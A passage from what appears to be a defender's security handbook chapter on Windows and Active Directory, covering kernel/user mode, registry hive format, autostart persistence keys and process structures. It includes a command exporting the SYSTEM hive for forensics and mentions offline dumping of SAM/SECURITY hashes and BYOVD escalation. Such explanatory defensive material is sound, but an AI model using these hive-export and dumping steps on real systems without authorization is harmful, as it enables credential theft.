@@ -1,0 +1,1986 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Chapter 3 — Windows &amp;amp; Active Directory — Security Handbook</title>
+<meta name="description" content="A security knowledge handbook — notes collected while learning and working in security.">
+<meta property="og:title" content="Chapter 3 — Windows &amp;amp; Active Directory — Security Handbook">
+<meta property="og:description" content="A security knowledge handbook — notes collected while learning and working in security.">
+<meta property="og:type" content="article">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>📓</text></svg>">
+<link rel="prev" href="ch02.html"><link rel="next" href="ch04.html">
+<script>(function(){var t=localStorage.getItem('kb-theme');if(t&&t!=='light')document.documentElement.setAttribute('data-theme',t);})();</script>
+<style>:root{--wibu-bg:url("../assets/wibu-bg.jpg")}</style>
+<style>
+:root{
+  --bg:#f4efe3; --panel:#ebe3d1; --panel2:#e1d7c0; --ink:#2b2620; --muted:#79705e;
+  --line:#d6cbb3; --accent:#0f6e60; --accent2:#b1502c; --code-bg:#241f18; --code-ink:#ece3d1;
+  --tbl-head:#e6dcc5; --tbl-zebra:#efe8d6; --kbd:#e6dcc5; --codeborder:#3a3228; --scroll:#cabda2;
+  --serif:Georgia,"Iowan Old Style","Times New Roman",serif;
+}
+html[data-theme="dark"]{
+  --bg:#16140f; --panel:#1e1b15; --panel2:#2a261d; --ink:#e9e2d2; --muted:#9c917c;
+  --line:#322d23; --accent:#46b3a3; --accent2:#e0824f; --code-bg:#0e0c08; --code-ink:#e9e2d2;
+  --tbl-head:#2a261d; --tbl-zebra:#1c1914; --kbd:#2c271e; --codeborder:#322d23; --scroll:#3a3328;
+}
+html[data-theme="wibu"]{
+  --bg:#241a38; --panel:rgba(38,28,55,.74); --panel2:rgba(60,44,86,.72); --ink:#f4ecff; --muted:#cbb9e6;
+  --line:rgba(255,255,255,.15); --accent:#ff79b0; --accent2:#a78bff; --code-bg:rgba(15,10,25,.85); --code-ink:#f0e8ff;
+  --tbl-head:rgba(60,44,86,.72); --tbl-zebra:rgba(48,35,70,.45); --kbd:rgba(70,52,98,.7); --codeborder:rgba(255,255,255,.13); --scroll:#7a5fae;
+}
+html[data-theme="wibu"] body{
+  background-color:#241a38;
+  background-image:var(--wibu-bg, none), linear-gradient(135deg,#2a1e44 0%,#46315f 55%,#5a3f74 100%);
+  background-size:cover; background-position:center; background-attachment:fixed;
+}
+html[data-theme="wibu"] .sidebar,
+html[data-theme="wibu"] .brand,
+html[data-theme="wibu"] .search,
+html[data-theme="wibu"] .topbar{backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px)}
+html[data-theme="wibu"] .main{background:rgba(18,12,30,.55);border:1px solid var(--line);border-radius:16px;
+  margin-top:20px;margin-bottom:20px;backdrop-filter:blur(4px);-webkit-backdrop-filter:blur(4px)}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{margin:0;background:var(--bg);color:var(--ink);
+  font:16px/1.72 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,"Noto Sans",sans-serif;}
+a{color:var(--accent);text-decoration:none}
+a:hover{text-decoration:underline}
+
+.wrap{display:flex;min-height:100vh}
+.sidebar{width:322px;flex:0 0 322px;background:var(--panel);border-right:1px solid var(--line);
+  height:100vh;position:sticky;top:0;overflow-y:auto;padding:0}
+.brand{padding:20px 18px 13px;border-bottom:1px solid var(--line);position:sticky;top:0;background:var(--panel);z-index:2}
+.brand h1{font-family:var(--serif);font-size:19px;margin:0 0 3px;letter-spacing:.2px;color:var(--ink)}
+.brand .tag{margin:3px 0 0;font-size:11.5px;color:var(--muted);line-height:1.45}
+.brand .author{display:block;margin-top:7px;font-size:11.5px;color:var(--accent2);font-weight:600}
+.controls{display:flex;gap:7px;margin-top:11px}
+.ctrl-btn{display:inline-flex;align-items:center;justify-content:center;gap:5px;background:var(--bg);
+  border:1px solid var(--line);color:var(--ink);border-radius:7px;padding:5px 10px;font-size:12px;
+  cursor:pointer;font-family:inherit;line-height:1;text-decoration:none}
+.ctrl-btn:hover{border-color:var(--accent);text-decoration:none}
+.search{padding:10px 14px;position:sticky;top:118px;background:var(--panel);z-index:2;border-bottom:1px solid var(--line)}
+.search input{width:100%;background:var(--bg);border:1px solid var(--line);color:var(--ink);
+  border-radius:7px;padding:8px 10px;font-size:13px;outline:none}
+.search input:focus{border-color:var(--accent)}
+.nav{padding:8px 8px 40px}
+.nav-group{padding:16px 10px 5px;font-family:var(--serif);font-size:11px;font-weight:700;letter-spacing:.4px;
+  text-transform:uppercase;color:var(--accent2)}
+.nav-chapter{margin:1px 0}
+.nav-ch-title{display:flex;gap:9px;align-items:baseline;padding:7px 10px;border-radius:7px;color:var(--ink);font-size:13.5px}
+.nav-ch-title .num{font-family:var(--serif);font-size:11px;color:var(--muted);font-variant-numeric:tabular-nums;min-width:18px}
+.nav-ch-title:hover{background:var(--panel2);text-decoration:none}
+.nav-chapter.active>.nav-ch-title{background:var(--bg);box-shadow:inset 3px 0 0 var(--accent);color:var(--ink);font-weight:700}
+.nav-chapter.active>.nav-ch-title .num{color:var(--accent)}
+.nav-subs{display:none;margin:2px 0 6px 27px;border-left:1px solid var(--line);padding-left:9px}
+.nav-chapter.open .nav-subs{display:block}
+.nav-sub{display:block;padding:4px 8px;font-size:12px;color:var(--muted);border-radius:6px;line-height:1.4}
+.nav-sub:hover{color:var(--accent);background:var(--panel2);text-decoration:none}
+
+.content{flex:1;min-width:0;padding:0 0 120px}
+.topbar{display:none}
+.main{max-width:820px;margin:0 auto;padding:40px 44px}
+.chapter{border-bottom:1px solid var(--line);padding-bottom:44px;margin-bottom:14px}
+.chapter h1{font-family:var(--serif);font-size:31px;line-height:1.22;margin:40px 0 20px;padding-bottom:12px;
+  border-bottom:2px solid var(--accent);color:var(--ink);scroll-margin-top:16px}
+.chapter:first-child h1{margin-top:8px}
+h2{font-family:var(--serif);font-size:23px;margin:36px 0 12px;color:var(--ink);scroll-margin-top:16px}
+h3{font-family:var(--serif);font-size:18px;margin:24px 0 8px;color:var(--ink);scroll-margin-top:16px}
+h4{font-size:14px;margin:18px 0 6px;color:var(--accent);font-weight:700}
+p{margin:11px 0}
+ul,ol{margin:11px 0;padding-left:24px}
+li{margin:5px 0}
+strong{color:var(--ink);font-weight:700}
+hr{border:0;border-top:1px solid var(--line);margin:28px 0}
+blockquote{margin:15px 0;padding:9px 16px;border-left:3px solid var(--accent2);
+  background:var(--panel);border-radius:0 7px 7px 0;color:var(--muted)}
+
+code{font-family:"SF Mono","JetBrains Mono",Consolas,"Liberation Mono",monospace;font-size:13px}
+:not(pre)>code{background:var(--kbd);color:var(--accent2);padding:1.5px 6px;border-radius:5px;font-size:12.5px}
+pre{background:var(--code-bg);border:1px solid var(--codeborder);border-radius:9px;padding:14px 16px;
+  overflow-x:auto;margin:15px 0;line-height:1.55}
+pre code{color:var(--code-ink);background:none;padding:0;font-size:12.7px;white-space:pre}
+
+.tbl-scroll,table{width:100%}
+table{border-collapse:collapse;margin:16px 0;font-size:13.5px;display:block;overflow-x:auto}
+th,td{border:1px solid var(--line);padding:8px 11px;text-align:left;vertical-align:top}
+th{background:var(--tbl-head);color:var(--ink);font-weight:700;white-space:nowrap}
+tbody tr:nth-child(even){background:var(--tbl-zebra)}
+
+.menu-btn{display:none}
+@media(max-width:980px){
+  .sidebar{position:fixed;left:0;top:0;z-index:50;transform:translateX(-100%);transition:transform .25s}
+  .sidebar.show{transform:none;box-shadow:0 0 40px rgba(20,15,8,.45)}
+  .topbar{display:flex;align-items:center;gap:10px;position:sticky;top:0;z-index:40;
+    background:var(--panel);border-bottom:1px solid var(--line);padding:10px 16px}
+  .menu-btn{display:inline-flex;background:var(--bg);border:1px solid var(--line);color:var(--ink);
+    border-radius:7px;padding:7px 12px;font-size:14px;cursor:pointer}
+  .topbar .ttl{font-family:var(--serif);font-size:15px;font-weight:700;flex:1}
+  .main{padding:24px 18px}
+  .chapter h1{font-size:25px}
+}
+::-webkit-scrollbar{width:11px;height:11px}
+::-webkit-scrollbar-thumb{background:var(--scroll);border-radius:6px;border:2px solid var(--bg)}
+::-webkit-scrollbar-track{background:transparent}
+
+.site-foot{max-width:820px;margin:54px auto 0;padding:24px 44px 0;border-top:1px solid var(--line);
+  color:var(--muted);font-size:13px;line-height:1.7}
+.site-foot a{color:var(--accent)}
+.site-foot .name{color:var(--ink);font-weight:700}
+@media(max-width:980px){.site-foot{padding:24px 18px 0}}
+.brand h1 a{color:var(--ink);text-decoration:none}
+.brand h1 a:hover{color:var(--accent)}
+.nav-sub.here{color:var(--accent);background:var(--panel2);font-weight:600}
+.pager{max-width:820px;margin:34px auto 0;display:flex;gap:14px;justify-content:space-between}
+.pg{flex:1 1 0;min-width:0;display:block;padding:13px 16px;border:1px solid var(--line);border-radius:10px;
+  background:var(--panel);color:var(--ink);text-decoration:none}
+a.pg:hover{border-color:var(--accent);text-decoration:none}
+a.pg:hover b{color:var(--accent)}
+.pg span{display:block;font-size:11.5px;color:var(--muted);margin-bottom:3px}
+.pg b{display:block;font-size:13.5px;font-weight:600;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.pg.next{text-align:right}
+span.pg{border:0;background:none}
+@media(max-width:980px){.pager{padding:0 18px}}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <aside class="sidebar" id="sidebar">
+    <div class="brand"><h1><a href="notes.html">Security Handbook</a></h1>
+      <p class="tag">Notes from learning &amp; working in security</p>
+      <span class="author">✍️ Fee</span>
+      <div class="controls"><a class="ctrl-btn" href="../">🏠 Home</a><button class="ctrl-btn themeBtn" title="Light / Dark / Wibu">🌙</button><a class="ctrl-btn themeLink" href="../notes.html">🌐 VI</a></div></div>
+    <div class="search"><input id="q" type="search" placeholder="Filter contents…" autocomplete="off"></div>
+    <nav class="nav"><div class="nav-chapter" data-ch="00"><a class="nav-ch-title" href="notes.html"><span class="num">00</span><span class="t">Intro &amp; Contents</span></a><div class="nav-subs"></div></div><div class="nav-group">Part A · Fundamentals</div><div class="nav-chapter" data-ch="01"><a class="nav-ch-title" href="ch01.html"><span class="num">01</span><span class="t">Networking</span></a><div class="nav-subs"></div></div><div class="nav-chapter" data-ch="02"><a class="nav-ch-title" href="ch02.html"><span class="num">02</span><span class="t">Linux</span></a><div class="nav-subs"></div></div><div class="nav-chapter open active" data-ch="03"><a class="nav-ch-title" href="#top"><span class="num">03</span><span class="t">Windows &amp; Active Directory</span></a><div class="nav-subs"><a class="nav-sub" href="#ch03-overview">Overview</a><a class="nav-sub" href="#ch03-31-windows-architecture-kernel-mode-and-user-mode">3.1. Windows Architecture: Kernel Mode and User Mode</a><a class="nav-sub" href="#ch03-32-registry-and-hive">3.2. Registry and Hive</a><a class="nav-sub" href="#ch03-33-process-thread-and-access-token">3.3. Process, Thread and Access Token</a><a class="nav-sub" href="#ch03-34-services-and-scheduled-tasks">3.4. Services and Scheduled Tasks</a><a class="nav-sub" href="#ch03-35-windows-event-log-the-core-security-event-ids">3.5. Windows Event Log — the core security Event IDs</a><a class="nav-sub" href="#ch03-36-sysmon-system-monitor">3.6. Sysmon — System Monitor</a><a class="nav-sub" href="#ch03-37-active-directory-logical-and-physical-structure">3.7. Active Directory — Logical and physical structure</a><a class="nav-sub" href="#ch03-38-ldap-the-ad-query-protocol">3.8. LDAP — the AD query protocol</a><a class="nav-sub" href="#ch03-39-kerberos-authentication-step-by-step">3.9. Kerberos — authentication step by step</a><a class="nav-sub" href="#ch03-310-ntlm-challengeresponse">3.10. NTLM — Challenge/Response</a><a class="nav-sub" href="#ch03-311-active-directory-attacks-and-their-event-id-signatures">3.11. Active Directory attacks and their Event ID signatures</a><a class="nav-sub" href="#ch03-312-powershell-logging">3.12. PowerShell Logging</a><a class="nav-sub" href="#ch03-313-laps-and-the-tiering-model">3.13. LAPS and the Tiering Model</a><a class="nav-sub" href="#ch03-314-summary-layered-defense">3.14. Summary: layered defense</a><a class="nav-sub" href="#ch03-my-notes">My notes</a></div></div><div class="nav-chapter" data-ch="04"><a class="nav-ch-title" href="ch04.html"><span class="num">04</span><span class="t">Cryptography &amp; Foundations</span></a><div class="nav-subs"></div></div><div class="nav-group">Part B · Application Security &amp; DevSecOps</div><div class="nav-chapter" data-ch="05"><a class="nav-ch-title" href="ch05.html"><span class="num">05</span><span class="t">Web App Security (OWASP)</span></a><div class="nav-subs"></div></div><div class="nav-chapter" data-ch="06"><a class="nav-ch-title" href="ch06.html"><span class="num">06</span><span class="t">DevSecOps &amp; Code Scanning</span></a><div class="nav-subs"></div></div><div class="nav-chapter" data-ch="07"><a class="nav-ch-title" href="ch07.html"><span class="num">07</span><span class="t">CI/CD &amp; GitOps</span></a><div class="nav-subs"></div></div><div class="nav-group">Part C · Monitoring, Detection &amp; Response</div><div class="nav-chapter" data-ch="08"><a class="nav-ch-title" href="ch08.html"><span class="num">08</span><span class="t">SIEM &amp; Log Management</span></a><div class="nav-subs"></div></div><div class="nav-chapter" data-ch="09"><a class="nav-ch-title" href="ch09.html"><span class="num">09</span><span class="t">Observability &amp; Monitoring</span></a><div class="nav-subs"></div></div><div class="nav-chapter" data-ch="10"><a class="nav-ch-title" href="ch10.html"><span class="num">10</span><span class="t">SOC &amp; Incident Response</span></a><div class="nav-subs"></div></div><div class="nav-group">Part D · Network Defense &amp; Testing</div><div class="nav-chapter" data-ch="11"><a class="nav-ch-title" href="ch11.html"><span class="num">11</span><span class="t">Network Defense (IDS/WAF/VPN)</span></a><div class="nav-subs"></div></div><div class="nav-chapter" data-ch="12"><a class="nav-ch-title" href="ch12.html"><span class="num">12</span><span class="t">Pentest &amp; Vuln Assessment</span></a><div class="nav-subs"></div></div><div class="nav-group">Part E · Infrastructure, Virtualization &amp; Cloud</div><div class="nav-chapter" data-ch="13"><a class="nav-ch-title" href="ch13.html"><span class="num">13</span><span class="t">Cloud Security</span></a><div class="nav-subs"></div></div><div class="nav-chapter" data-ch="14"><a class="nav-ch-title" href="ch14.html"><span class="num">14</span><span class="t">Virtualization &amp; Containers</span></a><div class="nav-subs"></div></div><div class="nav-group">Part F · Offense, Compliance &amp; Automation</div><div class="nav-chapter" data-ch="15"><a class="nav-ch-title" href="ch15.html"><span class="num">15</span><span class="t">Threat Intel &amp; Frameworks</span></a><div class="nav-subs"></div></div><div class="nav-chapter" data-ch="16"><a class="nav-ch-title" href="ch16.html"><span class="num">16</span><span class="t">Compliance &amp; Governance (GRC)</span></a><div class="nav-subs"></div></div><div class="nav-chapter" data-ch="17"><a class="nav-ch-title" href="ch17.html"><span class="num">17</span><span class="t">Programming &amp; Automation</span></a><div class="nav-subs"></div></div><div class="nav-group">Appendix</div><div class="nav-chapter" data-ch="99"><a class="nav-ch-title" href="ch99.html"><span class="num">99</span><span class="t">Glossary &amp; Abbreviations</span></a><div class="nav-subs"></div></div></nav>
+  </aside>
+  <div class="content">
+    <div class="topbar"><button class="menu-btn" id="menu">☰</button><span class="ttl">Security Handbook</span>
+      <button class="ctrl-btn themeBtn" title="Light / Dark / Wibu">🌙</button><a class="ctrl-btn themeLink" href="../notes.html">🌐 VI</a></div>
+    <main class="main" id="top">
+      <section class="chapter" id="sec-03" data-ch="03">
+<h1 id="ch03-chapter-3-windows-active-directory">Chapter 3 — Windows &amp; Active Directory</h1>
+<h2 id="ch03-overview">Overview</h2>
+<p>Most of the enterprise environments I've worked in run Windows and sit inside some AD domain, so for anyone on Blue Team this is the default terrain, not an optional one. I read this chapter to answer one question that runs through all of it: what path takes an attacker from a compromised workstation to domain-wide admin, and at which step does that path leave a trace you can actually catch.</p>
+<p>The chapter starts at the lowest layer of a single Windows box: the CPU privilege boundary between <strong>Kernel Mode</strong> and <strong>User Mode</strong> (where a vulnerable Ring 0 driver becomes a BYOVD privilege-escalation path), how configuration is stored in the <strong>Registry and Hive</strong> (autostart keys being malware's favorite place to hide), then the unit of execution and its security identity — <strong>process, thread, and access token</strong> — which is exactly what gets stolen or impersonated to escalate privileges. From persistence on a single machine, the chapter widens out to <strong>services</strong> and <strong>scheduled tasks</strong>, the two most commonly abused legitimate mechanisms for lateral movement. The observability side comes with it: the <strong>Windows Event Log</strong>, where Event IDs like 4624/4625 are the primary evidence trail, and <strong>Sysmon</strong>, which fills in what native auditing misses.</p>
+<p>The second half of the chapter shifts to the domain layer, where <strong>Active Directory</strong> centralizes administration through Domain, Forest, OU, and GPO — capturing AD is close to capturing the whole organization — and <strong>LDAP</strong> is both the protocol for querying that directory and a recon tool whose unusual queries can tip you off early. Two authentication protocols sit side by side so you can see why each is a target: <strong>Kerberos</strong>, ticket-based (a TGT traded for service tickets), underpins Kerberoasting and Golden/Silver Ticket attacks, while <strong>NTLM</strong> — the legacy challenge/response protocol still kept around for compatibility — carries the design weaknesses behind pass-the-hash and NTLM relay. The chapter closes with <strong>Active Directory attacks</strong>, tying every concept above into one offense-defense chain with its Event ID trail.</p>
+<blockquote>
+<p>Figures in this chapter follow Microsoft Docs, the MS-* Open Specifications, RFC 4120/4178, and the public Sysinternals/Sysmon source; anything unconfirmed is flagged "(needs verification)".</p>
+</blockquote>
+<hr />
+<h2 id="ch03-31-windows-architecture-kernel-mode-and-user-mode">3.1. Windows Architecture: Kernel Mode and User Mode</h2>
+<h3 id="ch03-311-what-it-is">3.1.1. What it is</h3>
+<p>Windows NT (the foundation of every modern Windows since XP/2000) divides the execution space into two CPU privilege rings on x86/x64:</p>
+<ul>
+<li><strong>User mode (Ring 3)</strong>: where application processes run. Each process has its own <strong>virtual address space</strong>, isolated from other processes. A crash of one process does not bring down the whole system.</li>
+<li><strong>Kernel mode (Ring 0)</strong>: where the operating system kernel, device drivers, and HAL run. Full access to hardware and all of RAM. An error here (a faulty driver, a NULL pointer dereference) causes a <strong>BSOD (Bug Check)</strong>.</li>
+</ul>
+<p>Separating the two rings is a hardware mechanism: the <code>CPL</code> field (Current Privilege Level, 2 bits) in the <code>CS</code> register determines the current ring. Privileged instructions (such as <code>HLT</code>, or writing to CR3) can only run when CPL=0.</p>
+<h3 id="ch03-312-internal-mechanism-address-space-layout-and-context-switching">3.1.2. Internal mechanism: address space layout and context switching</h3>
+<p>On Windows x64, the 64-bit virtual address space actually uses 48 bits (canonical address), divided as:</p>
+<table>
+<thead>
+<tr>
+<th>Region</th>
+<th>Address range (x64)</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>User space</td>
+<td><code>0x00000000'00000000</code> – <code>0x00007FFF'FFFFFFFF</code></td>
+<td>Process code/heap/stack (≈128 TB)</td>
+</tr>
+<tr>
+<td>Forbidden region (non-canonical)</td>
+<td><code>0x00008000'00000000</code> – <code>0xFFFF7FFF'FFFFFFFF</code></td>
+<td>Invalid, used to catch errors</td>
+</tr>
+<tr>
+<td>Kernel space</td>
+<td><code>0xFFFF8000'00000000</code> – <code>0xFFFFFFFF'FFFFFFFF</code></td>
+<td>Kernel, drivers, shared by all processes (≈128 TB)</td>
+</tr>
+</tbody>
+</table>
+<p><strong>The transition from user → kernel</strong> occurs via a <strong>system call</strong>. On x64, a user-mode function (for example <code>NtCreateFile</code> in <code>ntdll.dll</code>) loads the <strong>system service number (SSN)</strong> into the <code>EAX</code> register, then executes the <code>syscall</code> instruction:</p>
+<pre><code class="language-asm">; ntdll!NtCreateFile (abbreviated) — the SSN changes per Windows build
+mov  r10, rcx          ; the syscall convention uses r10 in place of rcx
+mov  eax, 0x55         ; SSN of NtCreateFile (example — must be verified per build)
+syscall                ; switches CPL 3 -&gt; 0, jumps into KiSystemCall64
+ret
+</code></pre>
+<p>The CPU reads the <code>IA32_LSTAR</code> MSR to find the kernel entry point (<code>nt!KiSystemCall64</code>), saves RIP/RFLAGS, and sets CPL=0. The kernel uses the SSN as an index into the <strong>SSDT (System Service Descriptor Table)</strong> <code>KeServiceDescriptorTable</code> to call the correct <code>Nt*</code> function.</p>
+<blockquote>
+<p><strong>Why:</strong> ring separation + controlled context switching prevents user-mode code from arbitrarily reading/writing kernel RAM or hardware — the foundation of all security isolation.</p>
+</blockquote>
+<h3 id="ch03-313-main-kernel-components">3.1.3. Main kernel components</h3>
+<table>
+<thead>
+<tr>
+<th>Component</th>
+<th>File</th>
+<th>Role</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Executive</td>
+<td><code>ntoskrnl.exe</code></td>
+<td>Object management, virtual memory (Mm), I/O Manager, Process/Thread</td>
+</tr>
+<tr>
+<td>Kernel (microkernel)</td>
+<td><code>ntoskrnl.exe</code></td>
+<td>Thread scheduling, synchronization, interrupts (DPC/APC)</td>
+</tr>
+<tr>
+<td>HAL</td>
+<td><code>hal.dll</code></td>
+<td>Hardware abstraction (timer, interrupts, bus)</td>
+</tr>
+<tr>
+<td>Win32k</td>
+<td><code>win32k.sys</code></td>
+<td>GDI/USER (graphics, windows) — a large attack surface</td>
+</tr>
+<tr>
+<td>Security Reference Monitor (SRM)</td>
+<td>within <code>ntoskrnl.exe</code></td>
+<td>Access checks, audit log generation</td>
+</tr>
+</tbody>
+</table>
+<h3 id="ch03-314-security-notes">3.1.4. Security notes</h3>
+<ul>
+<li><strong>PatchGuard (Kernel Patch Protection)</strong> on x64 prevents modification of the SSDT and kernel structures — but it also forces rootkits to switch to other techniques (BYOVD — Bring Your Own Vulnerable Driver).</li>
+<li>Drivers run in Ring 0 → a validly signed but vulnerable driver (for example, one that allows arbitrary physical memory read/write) is a common privilege-escalation vector. The Blue Team tracks driver loads via Sysmon Event ID 6.</li>
+</ul>
+<hr />
+<h2 id="ch03-32-registry-and-hive">3.2. Registry and Hive</h2>
+<h3 id="ch03-321-what-it-is">3.2.1. What it is</h3>
+<p>The Registry is a hierarchical database storing OS and application configuration. Its logical structure comprises <strong>keys</strong> (like folders), <strong>subkeys</strong>, and <strong>values</strong> (name–type–data triples).</p>
+<p>The <strong>root keys</strong> (logical hives):</p>
+<table>
+<thead>
+<tr>
+<th>Root key</th>
+<th>Abbreviation</th>
+<th>Physical data source</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>HKEY_LOCAL_MACHINE</code></td>
+<td>HKLM</td>
+<td>The hive files in <code>C:\Windows\System32\config\</code> (SYSTEM, SOFTWARE, SAM, SECURITY)</td>
+</tr>
+<tr>
+<td><code>HKEY_CURRENT_USER</code></td>
+<td>HKCU</td>
+<td><code>NTUSER.DAT</code> in the currently logged-on user's profile</td>
+</tr>
+<tr>
+<td><code>HKEY_USERS</code></td>
+<td>HKU</td>
+<td>NTUSER.DAT of every loaded user + <code>.DEFAULT</code></td>
+</tr>
+<tr>
+<td><code>HKEY_CLASSES_ROOT</code></td>
+<td>HKCR</td>
+<td>Merged view of HKLM\Software\Classes + HKCU\Software\Classes</td>
+</tr>
+<tr>
+<td><code>HKEY_CURRENT_CONFIG</code></td>
+<td>HKCC</td>
+<td>Linked to HKLM\SYSTEM\CurrentControlSet\Hardware Profiles\Current</td>
+</tr>
+</tbody>
+</table>
+<h3 id="ch03-322-internal-mechanism-the-hive-file-format-regf">3.2.2. Internal mechanism: the hive file format (regf)</h3>
+<p>A hive file uses a binary format with the <code>regf</code> signature. Its structure comprises a <strong>base block (header)</strong> that is 4096 bytes (0x1000) long, followed by <strong>hive bins (hbin)</strong> containing <strong>cells</strong>.</p>
+<p>The <strong>base block</strong> (regf header) layout — important fields:</p>
+<table>
+<thead>
+<tr>
+<th>Offset</th>
+<th>Size</th>
+<th>Field</th>
+<th>Meaning</th>
+<th>Example</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0x000</td>
+<td>4 bytes</td>
+<td>Signature</td>
+<td>Always ASCII <code>regf</code> (0x66676572 little-endian)</td>
+<td><code>72 65 67 66</code></td>
+</tr>
+<tr>
+<td>0x004</td>
+<td>4 bytes</td>
+<td>Primary sequence number</td>
+<td>Incremented when a write begins</td>
+<td><code>0x00000123</code></td>
+</tr>
+<tr>
+<td>0x008</td>
+<td>4 bytes</td>
+<td>Secondary sequence number</td>
+<td>Incremented when the write completes; if ≠ primary → hive dirty</td>
+<td><code>0x00000123</code></td>
+</tr>
+<tr>
+<td>0x00C</td>
+<td>8 bytes</td>
+<td>Last written timestamp</td>
+<td>FILETIME (100ns since 1601)</td>
+<td><code>0x01D9...</code></td>
+</tr>
+<tr>
+<td>0x014</td>
+<td>4 bytes</td>
+<td>Major version</td>
+<td>Usually 1</td>
+<td><code>0x00000001</code></td>
+</tr>
+<tr>
+<td>0x018</td>
+<td>4 bytes</td>
+<td>Minor version</td>
+<td>Usually 3, 5, or 6</td>
+<td><code>0x00000005</code></td>
+</tr>
+<tr>
+<td>0x020</td>
+<td>4 bytes</td>
+<td>Root cell offset</td>
+<td>Offset (from the start of the first hbin) to the root key node</td>
+<td><code>0x00000020</code></td>
+</tr>
+<tr>
+<td>0x028</td>
+<td>4 bytes</td>
+<td>Length</td>
+<td>Total size of the hive data</td>
+<td><code>0x00100000</code></td>
+</tr>
+<tr>
+<td>0x1FC</td>
+<td>4 bytes</td>
+<td>Checksum</td>
+<td>XOR of the first 508 bytes (per 4-byte word)</td>
+<td><code>0xABCD1234</code></td>
+</tr>
+</tbody>
+</table>
+<p>Each <strong>hbin</strong> is a multiple of 4096 bytes long, with an <code>hbin</code> signature header. Inside are <strong>cells</strong>: the first 4 bytes are the size (signed int32; negative = in use, positive = free). The cell node types:</p>
+<ul>
+<li><code>nk</code> (Key Node): a registry key. Contains the name, timestamp, and offsets to the subkey list, value list, and security (<code>sk</code>).</li>
+<li><code>vk</code> (Value Key): a value (name, REG_* type, offset/inline data).</li>
+<li><code>sk</code> (Security Key): contains the <strong>SECURITY_DESCRIPTOR</strong> (DACL/SACL/owner) for the key.</li>
+<li><code>lf</code>/<code>lh</code>/<code>li</code>/<code>ri</code>: the various subkey list forms (lh uses a hash for fast lookup).</li>
+</ul>
+<pre><code>+--------- HIVE FILE (regf) ----------+
+| Base block (4096 bytes)             |  &lt;- &quot;regf&quot; signature
++-------------------------------------+
+| hbin #0 (4096 bytes)                |  &lt;- &quot;hbin&quot; signature
+|   [cell: nk - ROOT KEY]             |
+|   [cell: sk - security descriptor]  |
+|   [cell: lh - subkey list]          |
+| hbin #1 ...                         |
+|   [cell: vk - value &quot;Start&quot;=2]      |
++-------------------------------------+
+</code></pre>
+<h3 id="ch03-323-real-world-example">3.2.3. Real-world example</h3>
+<p>Read a service's startup value and export a hive offline for forensic analysis:</p>
+<pre><code class="language-cmd">:: View a service's autostart config (Start=2 means Automatic)
+reg query &quot;HKLM\SYSTEM\CurrentControlSet\Services\Dnscache&quot; /v Start
+::  Start    REG_DWORD    0x2
+
+:: List the programs that auto-run at logon (a common persistence point)
+reg query &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Run&quot;
+
+:: Export the SYSTEM hive offline for analysis with forensic tools
+reg save HKLM\SYSTEM C:\ir\SYSTEM.hiv
+</code></pre>
+<p>Offline analysis with <code>RegRipper</code>/<code>reglookup</code> (Linux) or PowerShell:</p>
+<pre><code class="language-powershell"># List all Run values with their type and data
+Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' |
+  Format-List
+</code></pre>
+<p>The <code>Start</code> value in the Services hive (REG_DWORD):</p>
+<table>
+<thead>
+<tr>
+<th>Value</th>
+<th>Name</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0</td>
+<td>Boot</td>
+<td>Loaded by the kernel loader (early-boot drivers)</td>
+</tr>
+<tr>
+<td>1</td>
+<td>System</td>
+<td>Loaded during I/O initialization</td>
+</tr>
+<tr>
+<td>2</td>
+<td>Automatic</td>
+<td>Auto-started at boot by the SCM</td>
+</tr>
+<tr>
+<td>3</td>
+<td>Manual</td>
+<td>Started on demand</td>
+</tr>
+<tr>
+<td>4</td>
+<td>Disabled</td>
+<td>Disabled</td>
+</tr>
+</tbody>
+</table>
+<h3 id="ch03-324-security-notes">3.2.4. Security notes</h3>
+<ul>
+<li>The <strong>autostart extensibility points (ASEP)</strong> keys are where malware gains persistence: <code>...\CurrentVersion\Run</code>, <code>RunOnce</code>, <code>Image File Execution Options</code> (Debugger hijack), <code>Winlogon\Shell</code>, <code>Services</code>. Sysmon Event ID 12/13/14 record registry changes.</li>
+<li>The <code>SAM</code>/<code>SECURITY</code> hives contain local password hashes + LSA secrets — protected by a SYSTEM ACL but can be dumped offline (by copying the Volume Shadow Copy) → the <code>secretsdump</code> technique.</li>
+</ul>
+<hr />
+<h2 id="ch03-33-process-thread-and-access-token">3.3. Process, Thread and Access Token</h2>
+<h3 id="ch03-331-process-and-thread-structure">3.3.1. Process and Thread — structure</h3>
+<p>A <strong>process</strong> is a container (address space + handle table + token), while a <strong>thread</strong> is the unit that gets scheduled. Kernel structures:</p>
+<ul>
+<li><code>EPROCESS</code>: the process control block in the kernel (pointer to the page directory <code>DirectoryTableBase</code>/CR3, the thread list, <code>Token</code>, PID, PPID <code>InheritedFromUniqueProcessId</code>, ...).</li>
+<li><code>ETHREAD</code>/<code>KTHREAD</code>: the thread control block.</li>
+<li><code>PEB</code> (Process Environment Block, user-mode): contains <code>ImageBaseAddress</code>, the loaded module list (<code>Ldr</code>), command line, and environment variables.</li>
+</ul>
+<blockquote>
+<p><strong>Note:</strong> the <code>InheritedFromUniqueProcessId</code> field in EPROCESS is exactly the PPID that Sysmon records in Event ID 1 — important for detecting anomalous parent-child relationships (for example, <code>winword.exe</code> spawning <code>cmd.exe</code>).</p>
+</blockquote>
+<h3 id="ch03-332-access-token-the-authorization-mechanism">3.3.2. Access Token — the authorization mechanism</h3>
